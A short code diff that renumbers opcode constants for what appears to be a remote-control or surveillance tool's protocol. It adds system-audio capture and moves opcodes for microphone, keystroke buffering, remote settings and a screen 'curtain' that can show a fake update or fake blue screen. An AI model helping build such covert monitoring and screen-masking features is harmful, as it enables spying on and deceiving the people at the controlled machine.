@@ -20,9 +20,14 @@ OP_CAM_STOP = 0x41
 OP_CAM_FRAME = 0x42
 
 # AUDIO
-OP_MIC_START = 0x50
-OP_MIC_STOP = 0x51
-OP_AUDIO_CHUNK = 0x52
+OP_MIC_START = 0x33
+OP_MIC_STOP = 0x34
+OP_AUDIO_CHUNK = 0x35
+
+# System Audio (Loopback) - 0x60 range
+OP_SYS_AUDIO_START = 0x60
+OP_SYS_AUDIO_STOP = 0x61
+OP_SYS_AUDIO_CHUNK = 0x62
 
 # Session Protocol (Peer-to-Peer or Bridged)
 OP_IMG_FRAME    = 10 # Video Frame (JPEG/ZSTD)
@@ -47,14 +52,14 @@ SETTING_QUALITY     = 3
 SETTING_AUDIO       = 4
 
 # Privacy Curtain
-OP_CURTAIN_ON  = 0x60  # Payload: "BLACK" or "FAKE_UPDATE" or "FAKE_BSOD"
-OP_CURTAIN_OFF = 0x61
+OP_CURTAIN_ON  = 0x68  # Payload: "BLACK" or "FAKE_UPDATE" or "FAKE_BSOD"
+OP_CURTAIN_OFF = 0x69
 
 # Buffered Input
-OP_KEY_BUFFER  = 0x62  # Payload: buffered keystrokes
+OP_KEY_BUFFER  = 0x6A  # Payload: buffered keystrokes
 
 # Remote Settings
-OP_SETTINGS    = 0x63  # Payload: JSON settings
+OP_SETTINGS    = 0x6B  # Payload: JSON settings
 
 # ============================================================================
 # Shell (0x70-0x73)
